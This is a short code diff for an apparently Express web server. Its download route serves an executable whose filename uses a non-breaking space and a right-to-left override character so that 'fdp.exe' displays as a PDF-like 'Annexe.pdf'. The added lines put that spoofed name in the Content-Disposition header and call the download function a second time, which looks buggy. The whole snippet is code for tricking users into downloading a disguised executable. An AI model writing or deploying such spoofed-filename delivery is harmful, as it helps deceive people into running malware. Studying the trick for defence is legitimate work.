@@ -12,6 +12,9 @@ const filename = "Ann" + NBSP + RLO + "fdp.exe";
 
 app.get("/download", (req, res) => {
   const filePath = path.join(__dirname, "files", filename); // Change to your file
+  res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
+  res.download(filePath);
+
   res.download(filePath, filename); // Triggers file download
 });
 
